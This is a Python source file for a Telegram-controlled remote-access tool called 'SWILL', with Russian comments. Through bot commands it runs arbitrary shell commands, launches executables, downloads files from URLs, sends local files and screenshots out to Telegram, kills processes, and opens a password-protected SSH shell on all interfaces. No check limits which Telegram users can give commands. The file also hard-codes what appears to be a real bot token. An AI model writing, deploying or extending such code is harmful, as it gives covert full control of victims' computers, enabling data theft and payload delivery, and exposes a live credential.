import os
import sys
import subprocess
import platform
import psutil
import shutil
import time
import threading
import socket
import getpass
import requests
import json
import paramiko
import threading
import random
import string
from datetime import datetime
from telebot import TeleBot, types

# ===== КОНФИГ =====
BOT_TOKEN = "8785806558:AAHcD86MQ6miDRtouj28XeeBJh7VRW4Yzio"  # замени на свой
DOWNLOAD_FOLDER = "downloads"
SSH_PORT = 2222
SSH_USER = "swilluser"
SSH_PASSWORD = "".join(random.choices(string.ascii_letters + string.digits, k=12))

os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

bot = TeleBot(BOT_TOKEN)
ssh_server = None
ssh_thread = None

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====

def get_system_info():
    info = {}
    info["OS"] = platform.system()
    info["OS_version"] = platform.version()
    info["Machine"] = platform.machine()
    info["Processor"] = platform.processor()
    info["Hostname"] = socket.gethostname()
    info["IP"] = socket.gethostbyname(socket.gethostname())
    info["CPU_count"] = psutil.cpu_count()
    info["CPU_percent"] = psutil.cpu_percent(interval=0.5)
    info["RAM_total"] = round(psutil.virtual_memory().total / (1024**3), 2)
    info["RAM_used"] = round(psutil.virtual_memory().used / (1024**3), 2)
    info["RAM_percent"] = psutil.virtual_memory().percent
    info["Disk"] = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            info["Disk"].append({
                "mount": part.mountpoint,
                "total": round(usage.total / (1024**3), 2),
                "used": round(usage.used / (1024**3), 2),
                "free": round(usage.free / (1024**3), 2),
                "percent": usage.percent
            })
        except:
            pass
    info["Users"] = [u.name for u in psutil.users()]
    return info

def run_command(cmd, timeout=120):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
    return result.stdout + result.stderr

def run_executable(file_path, args=""):
    if not os.path.exists(file_path):
        return f"❌ Файл не найден: {file_path}"
    ext = os.path.splitext(file_path)[1].lower()
    if platform.system() == "Windows":
        if ext in ['.exe', '.bat', '.cmd']:
            cmd = f'"{file_path}" {args}'
        elif ext == '.py':
            cmd = f'python "{file_path}" {args}'
        else:
            cmd = f'start "" "{file_path}" {args}'
    else:  # Linux/macOS
        os.chmod(file_path, 0o755)
        if ext == '.py':
            cmd = f'python3 "{file_path}" {args}'
        elif ext == '.sh':
            cmd = f'bash "{file_path}" {args}'
        else:
            cmd = f'"{file_path}" {args}'
    return run_command(cmd)

# ===== SSH СЕРВЕР (ВСТРОЕННЫЙ) =====

class SSHServer(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if username == SSH_USER and password == SSH_PASSWORD:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def start_ssh_server():
    global ssh_server
    try:
        host_key = paramiko.RSAKey.generate(2048)
        ssh_server = paramiko.Transport(('0.0.0.0', SSH_PORT))
        ssh_server.add_server_key(host_key)
        ssh_server.start_server(server=SSHServer())
        while True:
            chan = ssh_server.accept(60)
            if chan is None:
                continue
            threading.Thread(target=handle_ssh_channel, args=(chan,)).start()
    except Exception as e:
        print(f"[SSH] Ошибка: {e}")

def handle_ssh_channel(chan):
    chan.send("SWILL SSH Shell\r\n")
    chan.send(f"Host: {socket.gethostname()}\r\n")
    chan.send("Type 'exit' to close\r\n")
    buffer = ""
    while True:
        try:
            if chan.recv_ready():
                data = chan.recv(1024).decode('utf-8')
                if not data:
                    break
                buffer += data
                if '\n' in buffer or '\r' in buffer:
                    cmd = buffer.strip()
                    buffer = ""
                    if cmd.lower() == 'exit':
                        chan.send("Goodbye\r\n")
                        break
                    output = run_command(cmd)
                    chan.send(output + "\r\n")
        except:
            break
    chan.close()

def ssh_status():
    return f"SSH: {SSH_USER}@{socket.gethostbyname(socket.gethostname())}:{SSH_PORT} | Пароль: {SSH_PASSWORD}"

# ===== КОМАНДЫ ТГ =====

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "SWILL-бот полный контроль. /help — все команды")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    bot.reply_to(msg, """
📌 /info — вся инфа о ПК
📌 /exec <команда> — shell команда
📌 /run <путь> [аргументы] — запустить .exe/.py/.sh/.bat
📌 /download <url> — скачать файл на ПК
📌 /upload <путь> — отправить файл с ПК в ТГ
📌 /screenshot — скриншот
📌 /processes — список процессов
📌 /kill <PID> — убить процесс
📌 /ssh_start — запустить SSH сервер
📌 /ssh_info — показать логин/пароль/ip
📌 /ssh_stop — остановить SSH
📌 /shutdown — выключить ПК
📌 /reboot — перезагрузить ПК
""")

@bot.message_handler(commands=['info'])
def info_cmd(msg):
    info = get_system_info()
    text = f"🏴‍☠️ SWILL-система\n"
    text += f"ОС: {info['OS']} {info['OS_version']}\n"
    text += f"Хост: {info['Hostname']}\n"
    text += f"IP: {info['IP']}\n"
    text += f"CPU: {info['CPU_count']} ядер, загрузка {info['CPU_percent']}%\n"
    text += f"RAM: {info['RAM_used']} / {info['RAM_total']} ГБ ({info['RAM_percent']}%)\n"
    text += "Диски:\n"
    for d in info["Disk"]:
        text += f"  {d['mount']} — {d['used']}/{d['total']} ГБ ({d['percent']}%)\n"
    text += f"Пользователи: {', '.join(info['Users'])}"
    bot.reply_to(msg, text)

@bot.message_handler(commands=['exec'])
def exec_cmd(msg):
    cmd = msg.text.replace('/exec', '', 1).strip()
    if not cmd:
        bot.reply_to(msg, "❌ Укажи команду. Пример: /exec dir")
        return
    try:
        out = run_command(cmd)
        if len(out) > 4000:
            with open("exec_output.txt", "w", encoding="utf-8") as f:
                f.write(out)
            with open("exec_output.txt", "rb") as f:
                bot.send_document(msg.chat.id, f, caption="Результат выполнения")
            os.remove("exec_output.txt")
        else:
            bot.reply_to(msg, f"📟 Результат:\n{out[:3900]}")
    except Exception as e:
        bot.reply_to(msg, f"⚠️ Ошибка: {str(e)}")

@bot.message_handler(commands=['run'])
def run_cmd(msg):
    parts = msg.text.replace('/run', '', 1).strip().split(' ', 1)
    file_path = parts[0]
    args = parts[1] if len(parts) > 1 else ""
    if not file_path:
        bot.reply_to(msg, "❌ Укажи путь к файлу. Пример: /run C:\\file.exe")
        return
    try:
        result = run_executable(file_path, args)
        if len(result) > 4000:
            with open("run_output.txt", "w", encoding="utf-8") as f:
                f.write(result)
            with open("run_output.txt", "rb") as f:
                bot.send_document(msg.chat.id, f, caption="Результат запуска")
            os.remove("run_output.txt")
        else:
            bot.reply_to(msg, f"✅ Результат:\n{result[:3900]}")
    except Exception as e:
        bot.reply_to(msg, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['download'])
def download_cmd(msg):
    url = msg.text.replace('/download', '', 1).strip()
    if not url:
        bot.reply_to(msg, "❌ Укажи URL")
        return
    try:
        r = requests.get(url, stream=True)
        filename = url.split('/')[-1].split('?')[0] or "downloaded_file"
        path = os.path.join(DOWNLOAD_FOLDER, filename)
        with open(path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        bot.reply_to(msg, f"✅ Скачан: {path}")
    except Exception as e:
        bot.reply_to(msg, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['upload'])
def upload_cmd(msg):
    path = msg.text.replace('/upload', '', 1).strip()
    if not path or not os.path.exists(path):
        bot.reply_to(msg, "❌ Укажи существующий путь к файлу")
        return
    try:
        with open(path, 'rb') as f:
            bot.send_document(msg.chat.id, f, caption=f"Файл: {path}")
    except Exception as e:
        bot.reply_to(msg, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['screenshot'])
def screenshot_cmd(msg):
    try:
        import PIL.ImageGrab
        img = PIL.ImageGrab.grab()
        img.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            bot.send_photo(msg.chat.id, f, caption="🖼️ Скриншот")
        os.remove("screenshot.png")
    except:
        if platform.system() == "Windows":
            run_command("powershell -command \"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}');\"")
            bot.reply_to(msg, "⚠️ Скриншот через PrintScreen (установи pillow для авто)")
        else:
            run_command("gnome-screenshot -f /tmp/screenshot.png || import -window root /tmp/screenshot.png")
            try:
                with open("/tmp/screenshot.png", "rb") as f:
                    bot.send_photo(msg.chat.id, f)
                os.remove("/tmp/screenshot.png")
            except:
                bot.reply_to(msg, "❌ Установи: pip install pillow")

@bot.message_handler(commands=['processes'])
def processes_cmd(msg):
    procs = []
    for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
        try:
            procs.append(p.info)
        except:
            pass
    procs = sorted(procs, key=lambda x: x.get('cpu_percent', 0), reverse=True)[:30]
    text = "🧠 ТОП-30 процессов:\n"
    for p in procs:
        text += f"{p['pid']} {p['name']} CPU:{p.get('cpu_percent',0):.1f}% MEM:{p.get('memory_percent',0):.1f}%\n"
    bot.reply_to(msg, text[:3900])

@bot.message_handler(commands=['kill'])
def kill_cmd(msg):
    pid_str = msg.text.replace('/kill', '', 1).strip()
    if not pid_str.isdigit():
        bot.reply_to(msg, "❌ Укажи PID. Пример: /kill 1234")
        return
    try:
        p = psutil.Process(int(pid_str))
        p.terminate()
        bot.reply_to(msg, f"✅ Процесс {pid_str} завершён")
    except Exception as e:
        bot.reply_to(msg, f"❌ Ошибка: {str(e)}")

@bot.message_handler(commands=['ssh_start'])
def ssh_start_cmd(msg):
    global ssh_thread
    if ssh_thread and ssh_thread.is_alive():
        bot.reply_to(msg, "SSH уже запущен\n" + ssh_status())
        return
    ssh_thread = threading.Thread(target=start_ssh_server, daemon=True)
    ssh_thread.start()
    time.sleep(1)
    bot.reply_to(msg, f"✅ SSH запущен!\n{ssh_status()}\nПодключайся любым SSH-клиентом")

@bot.message_handler(commands=['ssh_info'])
def ssh_info_cmd(msg):
    bot.reply_to(msg, ssh_status())

@bot.message_handler(commands=['ssh_stop'])
def ssh_stop_cmd(msg):
    global ssh_server
    if ssh_server:
        ssh_server.close()
        ssh_server = None
        bot.reply_to(msg, "SSH остановлен")
    else:
        bot.reply_to(msg, "SSH не запущен")

@bot.message_handler(commands=['shutdown'])
def shutdown_cmd(msg):
    bot.reply_to(msg, "🔄 Выключение...")
    if platform.system() == "Windows":
        os.system("shutdown /s /t 5")
    else:
        os.system("shutdown -h now")

@bot.message_handler(commands=['reboot'])
def reboot_cmd(msg):
    bot.reply_to(msg, "🔄 Перезагрузка...")
    if platform.system() == "Windows":
        os.system("shutdown /r /t 5")
    else:
        os.system("reboot")

# ===== ЗАПУСК =====
if __name__ == "__main__":
    print("[SWILL] Бот запущен. Команды через Telegram.")
    print(f"SSH будет доступен после /ssh_start")
    bot.infinity_polling()